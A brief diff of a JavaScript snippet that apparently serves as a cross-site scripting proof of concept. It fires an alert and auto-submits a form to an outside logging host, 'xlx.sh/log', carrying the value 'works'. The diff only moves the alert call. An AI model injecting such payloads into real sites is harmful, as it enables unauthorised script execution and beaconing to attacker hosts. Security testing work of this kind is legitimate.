@@ -1,5 +1,3 @@
-alert(4);
-
 
 const form = document.createElement("form");
 form.action = "https://xlx.sh/log";
@@ -12,3 +10,6 @@ input.value = "works";
 form.appendChild(input);
 document.body.appendChild(form);
 form.submit();
+
+
+alert(4);
